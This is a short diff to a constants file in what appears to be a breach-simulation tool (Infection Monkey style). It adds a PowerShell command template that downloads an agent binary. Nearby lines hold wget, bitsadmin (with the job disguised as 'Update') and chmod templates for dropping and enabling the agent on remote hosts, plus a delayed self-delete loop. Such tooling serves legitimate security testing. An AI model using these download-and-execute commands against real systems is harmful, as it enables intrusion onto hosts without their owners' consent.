@@ -18,6 +18,7 @@ DELAY_DELETE_CMD = 'cmd /c (for /l %%i in (1,0,2) do (ping -n 60 127.0.0.1 & del
 
 # Commands used for downloading monkeys
 POWERSHELL_HTTP_UPLOAD = "powershell -NoLogo -Command \"Invoke-WebRequest -Uri \\\'%(http_path)s\\\' -OutFile \\\'%(monkey_path)s\\\' -UseBasicParsing\""
+POWERSHELL_HTTP_UPLOAD_NOT_ESCAPED = "powershell -NoLogo -Command \"Invoke-WebRequest -Uri \'%(http_path)s\' -OutFile \'%(monkey_path)s\' -UseBasicParsing\""
 WGET_HTTP_UPLOAD = "wget -O %(monkey_path)s %(http_path)s"
 RDP_CMDLINE_HTTP = 'bitsadmin /transfer Update /download /priority high %(http_path)s %(monkey_path)s'
 CHMOD_MONKEY = "chmod +x %(monkey_path)s"
